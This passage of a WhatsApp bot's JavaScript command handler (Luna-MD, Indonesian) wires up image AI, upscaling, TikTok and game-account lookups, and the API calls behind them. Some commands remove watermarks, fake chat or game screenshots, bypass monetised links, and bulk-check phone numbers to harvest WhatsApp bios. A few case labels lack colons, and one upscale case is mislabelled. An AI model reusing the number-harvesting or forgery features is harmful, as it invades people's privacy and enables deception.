                timeout: 60000
            }
        )

        const contentType = response.headers["content-type"] || ""

        if (!contentType.includes("image")) {
            return m.reply("❌ API tidak mengembalikan gambar.")
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption: "🌸 Random Anime"
            },
            { quoted: m }
        )

    } catch (err) {
        console.error("ANIME ERROR:", err)
        m.reply("❌ Gagal mengambil gambar anime random.")
    }
}
break

case "imageai":
case "aiimg": {
    try {
        if (!text) {
            return m.reply(
                `Contoh:\n${prefix}zimage anime keren di kota malam`
            )
        }

        const axios = require("axios")

        await m.reply(
`
⏳ Sedang membuat gambar...`
        )

        const response = await axios.get(
            "https://bintangapi.my.id/api/aiimg/zimage",
            {
                params: {
                    prompt: text
                },
                responseType: "arraybuffer",
                timeout: 180000,

                
                transformResponse: [
                    data => data
                ],

                validateStatus: () => true
            }
        )

        console.log("ZIMAGE STATUS:", response.status)
        console.log(
            "ZIMAGE TYPE:",
            response.headers["content-type"]
        )
        console.log(
            "ZIMAGE LENGTH:",
            response.data?.length
        )

        if (response.status < 200 || response.status >= 300) {

            let errText

            try {
                errText =
                    Buffer
                        .from(response.data)
                        .toString("utf8")
            } catch {
                errText =
                    `HTTP ${response.status}`
            }

            return m.reply(
`❌ *ZIMAGE API ERROR*

HTTP:
${response.status}

${errText.substring(0, 1000)}`
            )
        }

        const imageBuffer =
            Buffer.from(response.data)

        if (!imageBuffer.length) {
            return m.reply(
                "❌ Response gambar kosong."
            )
        }

        const contentType =
            response.headers["content-type"] || ""

        console.log(
            "ZIMAGE BUFFER:",
            imageBuffer.length
        )

        
        if (
            !contentType.includes("image")
        ) {

            const result =
                imageBuffer.toString("utf8")

            console.log(
                "ZIMAGE NON-IMAGE RESPONSE:",
                result
            )

            return m.reply(
`❌ *API TIDAK MENGEMBALIKAN GAMBAR*

Content-Type:
${contentType}

Response:
${result.substring(0, 1000)}`
            )
        }

        
        await luna.sendMessage(
            m.chat,
            {
                image: imageBuffer,

                caption:
`✨ *IMAGE AI BERHASIL*

📝 Prompt:
${text}

📦 Size:
${(imageBuffer.length / 1024).toFixed(2)} KB

Luna-MD`
            },
            {
                quoted: m
            }
        )

    } catch (e) {

        console.log(
            "ZIMAGE ERROR:",
            e
        )

        return m.reply(
`❌ *ZIMAGE ERROR*

${e.message || e}`
        )
    }
}
break

case "upscale2": {
    try {
        if (!/image/.test(mime)) {
            return m.reply(
                `❌ *REPLY FOTO TERLEBIH DAHULU*

Contoh:
Reply foto lalu ketik:
${prefix}upscale2`
            )
        }

        await m.reply("⏳ Mengupload foto ke Pixhost...")

        let media = await luna.downloadAndSaveMediaMessage(qmsg)

        if (!media || !fs.existsSync(media)) {
            return m.reply("❌ Gagal mengambil foto.")
        }

        const { ImageUploadService } = require("node-upload-images")

        const service = new ImageUploadService("pixhost.to")

        let { directLink } = await service.uploadFromBinary(
            fs.readFileSync(media),
            "upscale2.png"
        )

        fs.unlinkSync(media)

        if (!directLink) {
            return m.reply("❌ Gagal mendapatkan URL Pixhost.")
        }

        const imageUrl = directLink.toString()

        await m.reply("⏳ Sedang memproses Upscale 2X...")

        const apiUrl =
            `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=2`

        const response = await axios.get(apiUrl, {
            responseType: "arraybuffer",
            timeout: 180000,
            headers: {
                "User-Agent": "Mozilla/5.0",
                "Accept": "image/*"
            },
            maxContentLength: 50 * 1024 * 1024,
            maxBodyLength: 50 * 1024 * 1024
        })

        if (!response.data || !response.data.length) {
            return m.reply(
                "❌ API tidak mengembalikan gambar."
            )
        }

        const contentType =
            response.headers["content-type"] || ""

        if (!contentType.includes("image")) {
            let errorText = ""

            try {
                errorText = Buffer
                    .from(response.data)
                    .toString("utf8")
            } catch {
                errorText = "Response API bukan gambar."
            }

            return m.reply(
`❌ *UPSCALE 2X GAGAL*

${errorText.substring(0, 1000)}`
            )
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption:
`✨ *IMAGE UPSCALE 2X*

✅ Berhasil meningkatkan kualitas foto.
`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log("UPSCALE2 ERROR:", e)

        return m.reply(
`❌ *UPSCALE 2X ERROR*

${e.response?.data?.message ||
e.response?.data?.msg ||
e.message ||
"Terjadi kesalahan tidak diketahui."}`
        )
    }
}
break

case "upscale3": {
    try {
        if (!/image/.test(mime)) {
            return m.reply(
                `❌ *REPLY FOTO TERLEBIH DAHULU*

Contoh:
Reply foto lalu ketik:
${prefix}upscale4`
            )
        }

        await m.reply("⏳ Mengupload foto ke Pixhost...")

        let media = await luna.downloadAndSaveMediaMessage(qmsg)

        if (!media || !fs.existsSync(media)) {
            return m.reply("❌ Gagal mengambil foto.")
        }

        const { ImageUploadService } = require("node-upload-images")

        const service = new ImageUploadService("pixhost.to")

        let { directLink } = await service.uploadFromBinary(
            fs.readFileSync(media),
            "upscale4.png"
        )

        fs.unlinkSync(media)

        if (!directLink) {
            return m.reply("❌ Gagal mendapatkan URL Pixhost.")
        }

        const imageUrl = directLink.toString()

        await m.reply("⏳ Sedang memproses Upscale 4X...")

        const apiUrl =
            `https://api.nexray.eu.cc/tools/v4/upscale?url=${encodeURIComponent(imageUrl)}&resolusi=4`

        const response = await axios.get(apiUrl, {
            responseType: "arraybuffer",
            timeout: 240000,
            headers: {
                "User-Agent": "Mozilla/5.0",
                "Accept": "image/*"
            },
            maxContentLength: 80 * 1024 * 1024,
            maxBodyLength: 80 * 1024 * 1024
        })

        if (!response.data || !response.data.length) {
            return m.reply(
                "❌ API tidak mengembalikan gambar."
            )
        }

        const contentType =
            response.headers["content-type"] || ""

        if (!contentType.includes("image")) {
            let errorText = ""

            try {
                errorText = Buffer
                    .from(response.data)
                    .toString("utf8")
            } catch {
                errorText = "Response API bukan gambar."
            }

            return m.reply(
`❌ *UPSCALE 4X GAGAL*

${errorText.substring(0, 1000)}`
            )
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption:
`🔥 *IMAGE UPSCALE 4X*

✅ Berhasil meningkatkan kualitas foto.
`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log("UPSCALE4 ERROR:", e)

        return m.reply(
`❌ *UPSCALE 4X ERROR*

${e.response?.data?.message ||
e.response?.data?.msg ||
e.message ||
"Terjadi kesalahan tidak diketahui."}`
        )
    }
}
break

case "upscale": {
    try {
        if (!/image/.test(mime)) {
            return m.reply(
                `❌ Reply/kirim foto terlebih dahulu

Contoh:
${prefix}upscale`
            )
        }

        await m.reply('⏳ Mengupload foto...')

        
        let media = await luna.downloadAndSaveMediaMessage(qmsg)

        if (!media || !fs.existsSync(media)) {
            return m.reply('❌ Gagal mengambil foto')
        }

        
        const { ImageUploadService } = require('node-upload-images')

        const service = new ImageUploadService('pixhost.to')

        let { directLink } = await service.uploadFromBinary(
            fs.readFileSync(media),
            'upscale.png'
        )

        
        fs.unlinkSync(media)

        if (!directLink) {
            return m.reply('❌ Gagal mendapatkan URL Pixhost')
        }

        const imageUrl = directLink.toString()

        await m.reply('⏳ Sedang meningkatkan kualitas foto...')

        
        const apiUrl =
            `https://api.nexray.eu.cc/tools/v1/upscale?url=${encodeURIComponent(imageUrl)}`

        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 120000,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            },
            maxContentLength: 30 * 1024 * 1024,
            maxBodyLength: 30 * 1024 * 1024
        })

        if (!response.data || !response.data.length) {
            return m.reply(
                '❌ API Upscale tidak mengembalikan gambar.'
            )
        }

        const contentType =
            response.headers['content-type'] || ''

        
        if (!contentType.includes('image')) {
            let errorText = ''

            try {
                errorText = Buffer
                    .from(response.data)
                    .toString('utf8')
            } catch {
                errorText = 'Response API bukan gambar.'
            }

            return m.reply(
                `❌ *UPSCALE GAGAL*

${errorText.substring(0, 1000)}`
            )
        }

        
        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption:
`✨ *IMAGE UPSCALE*

✅ Foto berhasil ditingkatkan kualitasnya.`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log('UPSCALE ERROR:', e)

        let errorMessage =
            e.response?.data?.message ||
            e.response?.data?.msg ||
            e.message ||
            'Terjadi kesalahan tidak diketahui.'

        if (
            e.code === 'ECONNABORTED' ||
            e.code === 'ETIMEDOUT'
        ) {
            errorMessage =
                'Request API timeout. Silakan coba lagi.'
        }

        if (e.response?.status === 404) {
            errorMessage =
                'Endpoint Upscale tidak ditemukan.'
        }

        if (e.response?.status === 429) {
            errorMessage =
                'Terlalu banyak request. Silakan tunggu beberapa saat.'
        }

        return m.reply(
`❌ *UPSCALE ERROR*

${errorMessage}`
        )
    }
}
break

case 'fakeffduo': {
    try {
        const axios = require('axios')

        if (!text) {
            return m.reply(`❌ *NICKNAME TIDAK BOLEH KOSONG*

Format:
.fakeffduo nickname1|nickname2`)
        }

        const args = text.split('|')

        if (args.length < 2) {
            return m.reply(`❌ *FORMAT SALAH*

Gunakan:
.fakeffduo nickname1|nickname2
`)
        }

        const nickname1 = args[0].trim()
        const nickname2 = args.slice(1).join('|').trim()

        if (!nickname1 || !nickname2) {
            return m.reply('❌ Kedua nickname wajib diisi.')
        }

        if (nickname1.length > 30 || nickname2.length > 30) {
            return m.reply('❌ Maksimal 30 karakter untuk setiap nickname.')
        }

        await m.reply('⏳ Sedang membuat Fake FF Duo...')

        const apiUrl =
            `https://apii.nexadev.my.id/fakeffduo?nickname1=${encodeURIComponent(nickname1)}&nickname2=${encodeURIComponent(nickname2)}`

        const response = await axios.get(apiUrl, {
            responseType: 'arraybuffer',
            timeout: 60000,
            headers: {
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'image/*'
            },
            maxContentLength: 15 * 1024 * 1024,
            maxBodyLength: 15 * 1024 * 1024
        })

        if (!response.data || response.data.length === 0) {
            return m.reply('❌ API tidak mengembalikan gambar.')
        }

        const contentType =
            response.headers['content-type'] || ''

        if (!contentType.startsWith('image/')) {
            let errorText

            try {
                errorText = Buffer
                    .from(response.data)
                    .toString('utf8')
            } catch {
                errorText = 'Response API bukan gambar.'
            }

            return m.reply(
                `❌ *GAGAL MEMBUAT FAKE FF DUO*

${errorText.substring(0, 1000)}`
            )
        }

        await luna.sendMessage(
            m.chat,
            {
                image: Buffer.from(response.data),
                caption: `🎮 *FAKE FREE FIRE DUO*`
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.log('FAKEFFDUO ERROR:', e)

        let errorMessage =
            e.response?.data?.message ||
            e.response?.data?.msg ||
            e.message ||
            'Terjadi kesalahan tidak diketahui.'

        if (
            e.code === 'ECONNABORTED' ||
            e.code === 'ETIMEDOUT'
        ) {
            errorMessage =
                'Request API timeout. Silakan coba lagi.'
        }

        if (e.response?.status === 404) {
            errorMessage =
                'Endpoint Fake FF Duo tidak ditemukan (404).'
        }

        if (e.response?.status === 429) {
            errorMessage =
                'Terlalu banyak request. Tunggu beberapa saat.'
        }

        return m.reply(
            `❌ *FAKE FF DUO ERROR*

${errorMessage}`
        )
    }
}
break

case "sc"
case "getsc"
case "script": {

const foto = fs.readFileSync("./media/Luna.jpg")
const sc = ""
const anu = `
halo *${m.pushName}*, jika kamu menginginkan script Luna-MD ini silahkan baca aturan di bawah ini.

\`PERINGATAN KERAS\`
- dilarang keras menghapus credits
- dilarang memperjual belikan script ini karena 100% free dan script ini open source
- dilarang mengklaim/memiliki script ini 100%
- dilarang menghapus, mengganti, menyembunyikan, atau mengklaim credits
- jika kamu melakukan recode, modifikasi, atau redistribusi source, *credits asli WAJIB tetap dicantumkan*.
- open source bukan berarti bebas menghapus credits. Hormati pembuat dan contributor yang sudah mengembangkan source ini
`.trim()
    try {
        const media = await prepareWAMessageMedia(
            { image: foto },
            { upload: luna.waUploadToServer }
        );
        const interactiveMsg = {
            body: { text: sc },
            footer: { text: anu },
            header: {
                hasMediaAttachment: true,
                imageMessage: media.imageMessage
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "get sc",
                            url: "https://github.com/noxXza/base-noxleyss",
                            merchant_url: "https://www.google.com"
                        })
                    }
                ],
                messageParamsJson: "{}"
            }
        };

        const generatedMsg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: interactiveMsg
                }
            }
        }, { userJid: m.chat, upload: luna.waUploadToServer });

        return await luna.relayMessage(m.chat, generatedMsg.message, {
            messageId: generatedMsg.key.id
        });
    } catch (e) {
        console.log(e);
        reply(`❌ Gagal kirim pesan: ${e.message}`);
    }
}
break

case "delwatermark": {
    if (!m.quoted) {
        return m.reply(
            "❌ Reply foto yang ingin diproses."
        )
    }

    const mime =
        (m.quoted.msg || m.quoted).mimetype || ""

    if (!/^image\//i.test(mime)) {
        return m.reply(
            "❌ Reply foto, bukan video atau dokumen."
        )
    }

    let media = null

    try {
        const fs = require("fs")
        const axios = require("axios")
        const { ImageUploadService } = require("node-upload-images")

        
        
        

        await m.reply(
            "⏳ *DEWATERMARK*\n\n" +
            "📥 Mengambil foto..."
        )

        
        
        

        media =
            await luna.downloadAndSaveMediaMessage(
                m.quoted
            )

        if (
            !media ||
            !fs.existsSync(media)
        ) {
            throw new Error(
                "Gagal mendownload foto."
            )
        }

        
        
        

        await m.reply(
            "🌐 Upload foto ke Pixhost..."
        )

        const service =
            new ImageUploadService(
                "pixhost.to"
            )

        const upload =
            await service.uploadFromBinary(
                fs.readFileSync(media),
                "luna-md.jpg"
            )

        if (
            !upload ||
            !upload.directLink
        ) {
            throw new Error(
                "Gagal mendapatkan direct link Pixhost."
            )
        }

        const imageUrl =
            upload.directLink.toString()

        console.log(
            "[DEWATERMARK URL]",
            imageUrl
        )

        
        try {
            fs.unlinkSync(media)
            media = null
        } catch {}

        
        
        

        await m.reply(
            "🧹 Menghapus watermark...\n" +
            "⏳ Tunggu sebentar..."
        )

        const apiUrl =
            "https://api.nexray.eu.cc/tools/v1/dewatermark?url=" +
            encodeURIComponent(imageUrl)

        

        const response =
            await axios.get(
                apiUrl,
                {
                    responseType: "arraybuffer",
                    timeout: 180000,
                    headers: {
                        "User-Agent":
                            "Mozilla/5.0"
                    }
                }
            )

        
        
        

        const resultBuffer =
            Buffer.from(response.data)

        if (
            !resultBuffer ||
            resultBuffer.length < 100
        ) {
            throw new Error(
                "Hasil dari API kosong atau rusak."
            )
        }

        console.log(
            "[DEWATERMARK]",
            "Content-Type:",
            response.headers["content-type"]
        )

        console.log(
            "[DEWATERMARK]",
            "Size:",
            resultBuffer.length,
            "bytes"
        )

        
        
        

        const isPNG =
            resultBuffer
                .subarray(0, 8)
                .equals(
                    Buffer.from([
                        0x89,
                        0x50,
                        0x4E,
                        0x47,
                        0x0D,
                        0x0A,
                        0x1A,
                        0x0A
                    ])
                )

        if (!isPNG) {
            

            const textResponse =
                resultBuffer.toString(
                    "utf8"
                )

            console.log(
                "[DEWATERMARK NON-PNG]",
                textResponse.slice(0, 2000)
            )

            throw new Error(
                "API tidak mengembalikan gambar PNG."
            )
        }

        
        
        

        await luna.sendMessage(
            m.chat,
            {
                image: resultBuffer,
                mimetype: "image/png",
                caption:
                    "✅ *DEWATERMARK BERHASIL*\n\n" +
                    "🧹 Watermark sudah diproses."
            },
            {
                quoted: m
            }
        )

        console.log(
            "[DEWATERMARK] Berhasil mengirim hasil."
        )

    } catch (e) {

        console.error(
            "[DEWATERMARK ERROR]",
            e
        )

        return m.reply(
            "❌ *DEWATERMARK GAGAL*\n\n" +
            "Error: " +
            (
                e?.response?.data
                    ? Buffer.isBuffer(e.response.data)
                        ? e.response.data
                            .toString("utf8")
                            .slice(0, 500)
                        : JSON.stringify(
                            e.response.data
                        ).slice(0, 500)
                    : e?.message || e
            )
        )

    } finally {

        
        
        

        if (
            media &&
            fs.existsSync(media)
        ) {
            try {
                fs.unlinkSync(media)
            } catch {}
        }
    }
}
break

case "ttphoto": {
    if (!text) {
        return m.reply(
            "❌ Masukkan kata kunci pencarian.\n\n" +
            `Contoh:\n${prefix}tiktokphoto anime kece`
        )
    }

    try {
        const axios = require("axios")

        await m.reply("🔎 Sedang mencari foto TikTok...")

        const apiUrl =
            "https://api.nexray.eu.cc/search/tiktokphoto?q=" +
            encodeURIComponent(text)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log("[TIKTOKPHOTO RESPONSE]", data)

        if (!data) {
            return m.reply("❌ API tidak memberikan response.")
        }

        
        const results =
            Array.isArray(data?.result) ? data.result :
            Array.isArray(data?.results) ? data.results :
            Array.isArray(data?.data) ? data.data :
            Array.isArray(data?.data?.result) ? data.data.result :
            Array.isArray(data?.data?.results) ? data.data.results :
            []

        if (!results.length) {
            return m.reply(
                "❌ Foto tidak ditemukan untuk pencarian:\n" +
                `"${text}"`
            )
        }

        
        const imageUrls = results
            .map(item => {
                if (typeof item === "string") return item

                return (
                    item?.url ||
                    item?.image ||
                    item?.imageUrl ||
                    item?.photo ||
                    item?.download ||
                    item?.downloadUrl ||
                    item?.cover
                )
            })
            .filter(url =>
                typeof url === "string" &&
                /^https?:\/\//i.test(url)
            )

        if (!imageUrls.length) {
            return m.reply(
                "❌ Hasil API ditemukan, tetapi URL fotonya tidak ditemukan.\n\n" +
                "Response API:\n" +
                JSON.stringify(data, null, 2).slice(0, 4000)
            )
        }

        
        const photos = imageUrls.slice(0, 10)

        await m.reply(
            `✅ Ditemukan ${imageUrls.length} foto.\n` +
            `📸 Mengirim ${photos.length} hasil pertama...`
        )

        for (let i = 0; i < photos.length; i++) {
            try {
                await luna.sendMessage(
                    m.chat,
                    {
                        image: {
                            url: photos[i]
                        },
                        caption:
                            `📸 *TIKTOK PHOTO*\n\n` +
                            `🔎 Query: ${text}\n` +
                            `📌 Hasil: ${i + 1}/${photos.length}`
                    },
                    {
                        quoted: m
                    }
                )
            } catch (err) {
                console.error(
                    `[TIKTOKPHOTO IMAGE ${i + 1}]`,
                    err
                )
            }
        }

    } catch (e) {
        console.error("[TIKTOKPHOTO ERROR]", e)

        return m.reply(
            "❌ Gagal mencari TikTok Photo.\n\n" +
            "Error: " +
            (
                e?.response?.data?.message ||
                e?.response?.data?.error ||
                e?.message ||
                e
            )
        )
    }
}
break

case "geminitts": {
    if (!text) {
        return m.reply(
            "❌ Masukkan teks yang ingin diubah menjadi suara.\n\n" +
            `Contoh:\n${prefix}geminitts halo apa kabar`
        )
    }

    try {
        const axios = require("axios")

        await m.reply("⏳ Sedang membuat suara...")

        const apiUrl =
            "https://api.nexray.eu.cc/ai/gemini-tts?text=" +
            encodeURIComponent(text)

        const response = await axios.get(apiUrl, {
            timeout: 120000
        })

        const data = response.data

        if (!data?.status || !data?.result) {
            console.log("[GEMINI TTS RESPONSE]", data)

            return m.reply(
                "❌ API tidak mengembalikan audio yang valid."
            )
        }

        const audioUrl = data.result

        
        await luna.sendMessage(
            m.chat,
            {
                audio: {
                    url: audioUrl
                },
                mimetype: "audio/mpeg",
                ptt: false
            },
            {
                quoted: m
            }
        )

    } catch (e) {
        console.error("[GEMINI TTS ERROR]", e)

        return m.reply(
            "❌ Gagal membuat suara.\n\n" +
            "Error: " +
            (
                e?.response?.data?.message ||
                e?.response?.data?.error ||
                e?.message ||
                e
            )
        )
    }
}
break

case 'pakeko': {
  try {

    if (!text) {
      return m.reply(
        `Contoh:\n.fakenokia jatuh cinta boleh alasan jangan just friend`
      )
    }

    const { createCanvas, loadImage } = require('canvas')
    const fs = require('fs')
    const path = require('path')
    const https = require('https')
    const http = require('http')

    const BG_URL = 'https://img3.pixhost.to/images/5090/760870690_rafaofficial.jpg'
    const BG_PATH = path.join(__dirname, 'assets', 'nokia_bg.jpg')

    fs.mkdirSync(path.join(__dirname, 'assets'), { recursive: true })

    const downloadFile = (url, dest) => new Promise((resolve, reject) => {
      if (fs.existsSync(dest)) return resolve()
      const file = fs.createWriteStream(dest)
      const client = url.startsWith('https') ? https : http
      client.get(url, (res) => {
        if (res.statusCode !== 200) {
          fs.unlink(dest, () => {})
          return reject(new Error(`HTTP ${res.statusCode}`))
        }
        res.pipe(file)
        file.on('finish', () => file.close(resolve))
      }).on('error', (err) => {
        fs.unlink(dest, () => {})
        reject(err)
      })
    })

    await downloadFile(BG_URL, BG_PATH)

    const pesan = text.trim()

    const bg = await loadImage(BG_PATH)
    const W = bg.width
    const H = bg.height

    const canvas = createCanvas(W, H)
    const ctx = canvas.getContext('2d')
    ctx.drawImage(bg, 0, 0, W, H)

    function wrapLine(ctx, text, maxWidth) {
      const words = text.split(' ')
      const wrapped = []
      let current = ''
      for (const word of words) {
        const test = current ? current + ' ' + word : word
        if (ctx.measureText(test).width > maxWidth && current) {
          wrapped.push(current)
          current = word
        } else {
          current = test
        }
      }
      if (current) wrapped.push(current)
      return wrapped.length ? wrapped : [text]
    }

    
    
    
    const BOX_X = W * 0.083
    const BOX_Y = H * 0.340
    const BOX_W = W * 0.850
    const BOX_H = H * 0.250

    const FIXED_FONT = Math.floor(H * 0.045)
    const MIN_FONT = 14

    let fontSize = FIXED_FONT
    let wrappedLines = []

    ctx.textAlign = 'left'
    ctx.textBaseline = 'top'
    ctx.fillStyle = '#111111'

    while (fontSize >= MIN_FONT) {
      ctx.font = `bold ${fontSize}px Arial`
      wrappedLines = wrapLine(ctx, pesan, BOX_W)
      const lineH = fontSize * 1.30
      const totalH = wrappedLines.length * lineH
      if (totalH <= BOX_H) break
      fontSize -= 2
    }

    const lineHeight = fontSize * 1.30
    const startY = BOX_Y + (BOX_H - (wrappedLines.length * lineHeight)) / 2

    ctx.save()
    ctx.beginPath()
    ctx.rect(BOX_X, BOX_Y, BOX_W, BOX_H)
    ctx.clip()

    ctx.font = `bold ${fontSize}px Arial`
    wrappedLines.forEach((line, i) => {
      const y = startY + (i * lineHeight)
      if (y > BOX_Y + BOX_H - lineHeight) return
      ctx.fillText(line, BOX_X, y)
    })
    ctx.restore()

    
    
    
    const buffer = canvas.toBuffer('image/jpeg', { quality: 0.95 })

    await luna.sendMessage(
      m.chat,
      {
        image: buffer,
        caption: '📱 Fake Nokia Message'
      },
      { quoted: m }
    )

  } catch (e) {
    console.log(e)
    m.reply('❌ Error fakenokia')
  }
}
break

case 'mlstalk':
case 'cekml':
case 'stalkml': {
try {

if (!text) {
return m.reply(`*Format Penggunaan :*

${prefix + command} 541247863|8179

*Contoh :*
${prefix + command} 541247863|8179`)
}

let [userid, zoneid] = text.split("|")

if (!userid || !zoneid) {
return m.reply(`❌ Format salah!

Contoh:
${prefix + command} 541247863|8179`)
}

Reply("⏳ Sedang mengambil data akun Mobile Legends...")

const axios = require("axios")

const api = `https://bintangapi.my.id/api/stalker/ml?user_id=${encodeURIComponent(userid.trim())}&zone_id=${encodeURIComponent(zoneid.trim())}`

const { data } = await axios.get(api)

if (!data.success) {
return m.reply("❌ ID atau Zone ID tidak ditemukan.")
}

const res = data.data

let teks = `乂 *MOBILE LEGENDS STALK*

╭━━━〔 🎮 ACCOUNT INFO 〕━━⬣
┃ 👤 Nickname : ${res.nickname}
┃ 🆔 User ID : ${res.user_id}
┃ 🌐 Zone ID : ${res.zone_id}
┃ 🌍 Region : ${res.region}
╰━━━━━━━━━━━━━━━━⬣

> Powered By Luna-MD`

await luna.sendMessage(
m.chat,
{
text: teks
},
{
quoted: m
}
)

} catch (e) {
console.log(e)
m.reply(`❌ Gagal mengambil data!\n\n${e.message}`)
}
}
break

case 'ttstalk':
case "tiktokearnings": {
    try {
        const username = text?.trim()

        if (!username) {
            return m.reply(
                example("mrbeast")
            )
        }

        await m.reply("⏳ Sedang mengambil data TikTok...")

        const apiUrl =
            "https://api.nexray.eu.cc/tools/tiktokearnings?username=" +
            encodeURIComponent(username)

        const response = await axios.get(apiUrl, {
            timeout: 60000
        })

        const data = response.data

        console.log(
            "TIKTOK EARNINGS RESPONSE:",
            JSON.stringify(data, null, 2)
        )

        if (!data?.status || !data?.result) {
            return m.reply(
                "❌ Data TikTok tidak ditemukan."
            )
        }

        const result = data.result

        const followers = Number(result.followers || 0)
        const likes = Number(result.average_likes || 0)
        const earnings = Number(result.earnings || 0)
        const engagement = Number(result.engagement || 0)

        const formatNumber = (num) => {
            return new Intl.NumberFormat("id-ID").format(num)
        }

        const formatMoney = (num) => {
            return new Intl.NumberFormat("en-US", {
                style: "currency",
                currency: "USD"
            }).format(num)
        }

        const teks =
            `🎵 *TIKTOK EARNINGS*\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `👤 Name: *${result.name || username}*\n` +
            `🔗 Username: *@${username.replace(/^@/, "")}*\n\n` +
            `👥 Followers: *${formatNumber(followers)}*\n` +
            `❤️ Average Likes: *${formatNumber(likes)}*\n` +
            `📹 Posts: *${formatNumber(Number(result.posts || 0))}*\n` +
            `💰 Estimated Earnings: *${formatMoney(earnings)}*\n` +
            `📈 Engagement: *${engagement}%*\n\n` +
            `━━━━━━━━━━━━━━━━━━\n` +
            `🤖 Source: Luna-MD`

        await m.reply(teks)

    } catch (err) {
        console.error(
            "TIKTOK EARNINGS ERROR:",
            err?.response?.data || err
        )

        return m.reply(
            "❌ Gagal mengambil data TikTok.\n" +
            "Pastikan username benar atau API sedang bermasalah."
        )
    }
}
break

case 'blurface': {
try {

if (!/image/.test(mime)) {
return m.reply(example("dengan kirim/reply foto"))
}

Reply("⏳ Mengupload gambar ke Pixhost...")

const { ImageUploadService } = require("node-upload-images")
const fs = require("fs")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")

const { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
`blurface_${Date.now()}.jpg`
)

fs.unlinkSync(media)

if (!directLink) {
return m.reply("❌ Gagal upload ke Pixhost.")
}

Reply("⏳ Sedang memproses Blur Face...")

const api = `https://api.nexray.eu.cc/tools/blurface?url=${encodeURIComponent(directLink)}`

await luna.sendMessage(
m.chat,
{
image: {
url: api
},
caption: `
乂 *BLUR FACE SUCCESS*
> Berhasil membuat efek Blur Face.`
},
{
quoted: m
}
)

} catch (e) {
console.log(e)
m.reply(`❌ Gagal membuat Blur Face!\n\n${e.message}`)
}
}
break

case "bypassurl":
case "bypass2":
case "bypasslink": {
try {

if (!text) {
return reply(`Contoh penggunaan:

${prefix + command} https://linkvertise.com/access/1239053/55d5Jdz1eY7h`);
}

if (!/^https?:\/\//i.test(text)) {
return reply("❌ Masukkan URL yang valid.");
}

Reply("⏳ Sedang membypass URL...");

const axios = require("axios");

const api = `https://bintangapi.my.id/api/tools/bypassurl2?url=${encodeURIComponent(text)}`;

const { data } = await axios.get(api, {
timeout: 60000
});

if (!data?.success) {
return reply("❌ Gagal membypass URL.");
}

const result = data.data?.result || "-";
const original = data.data?.url || text;

let hasil = `*✅ BYPASS URL BERHASIL*

🔗 *URL Asli :*
${original}

📂 *Hasil Bypass :*
${result}

> Powered By Luna-MD`;

await luna.sendMessage(m.chat, {
text: hasil
}, {
quoted: m
});

} catch (e) {
console.log(e);

Reply(`❌ Gagal membypass URL.

${e.response?.data?.message || e.message}`);

}
}
break;

case 'removebg':
case 'rvbg':
case 'rmbg':
case 'removebackground': {
try {

if (!/image/.test(mime)) {
return m.reply(example("dengan kirim/reply foto"))
}

Reply("⏳ Mengupload gambar ke Pixhost...")

const { ImageUploadService } = require("node-upload-images")
const fs = require("fs")
const axios = require("axios")

let media = await luna.downloadAndSaveMediaMessage(qmsg)

const service = new ImageUploadService("pixhost.to")

const { directLink } = await service.uploadFromBinary(
fs.readFileSync(media),
`removebg_${Date.now()}.jpg`
)

fs.unlinkSync(media)

if (!directLink) {
return m.reply("❌ Gagal upload gambar ke Pixhost.")
}

Reply("⏳ Sedang menghapus background...")

const api = `https://api.nexray.eu.cc/tools/removebg?url=${encodeURIComponent(directLink)}`


const { data } = await axios.get(api, {
responseType: "arraybuffer",
timeout: 120000,
headers: {
Accept: "image/*"
}
})

await luna.sendMessage(
m.chat,
{
image: Buffer.from(data),
caption: `乂 *REMOVE BACKGROUND SUCCESS*
> Background berhasil dihapus.`
},
{
quoted: m
}
)

} catch (e) {
console.log(e)

if (e.response) {
console.log("Status:", e.response.status)
console.log("Data:", e.response.data?.toString?.())
}

m.reply(`❌ Gagal menghapus background!\n\n${e.message}`)
}
}
break

case "cekbio2": {
try {

if (!text) return reply(`Contoh:\n${prefix + command} 62812xxxx,62813xxxx`);

let input = text
.replace(/\n/g, ",")
.replace(/\s/g, "");

let numbers = input.split(",").filter(v => v);

if (numbers.length < 1) return reply("Masukkan minimal 1 nomor.");

Reply(`⏳ Sedang mengecek ${numbers.length} nomor...`);

let withBio = [];
let noBio = [];
let notReg = [];

const batchSize = 15;

for (let i = 0; i < numbers.length; i += batchSize) {

const batch = numbers.slice(i, i + batchSize);

await Promise.allSettled(batch.map(async (nomor) => {

let jid = nomor.replace(/\D/g, "") + "@s.whatsapp.net";

try {

const check = await luna.onWhatsApp(jid);

if (!check || !check[0]?.exists) {
notReg.push(nomor);
return;
}

try {

const status = await luna.fetchStatus(jid);

if (status && status.status && status.status.trim() !== "") {

withBio.push({
nomor,
bio: status.status,
setAt: status.setAt || "-"
});

} else {

noBio.push(nomor);

}

} catch {

noBio.push(nomor);

}

} catch {

notReg.push(nomor);

}

}));

await new Promise(resolve => setTimeout(resolve, 1000));

}

let hasil = `*HASIL CEK BIO*\n\n`;
hasil += `✅ Total Dicek : ${numbers.length}\n`;
hasil += `📝 Dengan Bio : ${withBio.length}\n`;
